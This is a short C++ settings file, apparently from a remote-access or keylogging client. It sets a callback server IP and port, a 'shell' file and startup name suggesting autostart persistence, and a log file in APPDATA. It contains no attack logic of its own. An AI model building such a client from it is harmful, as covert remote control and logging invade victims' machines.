#include "settings.h"
#include "Shared/folders.h"

const char* Settings::serverIP = "127.0.0.1";	//server ip
int Settings::serverPort = 8559;					//server port

std::string Settings::fileName =		SHELL_NAME;	
std::string Settings::startupName =		SHELL_NAME;	
std::string Settings::logFileName =		"log.txt";	
std::string Settings::logFileLocation = "APPDATA";	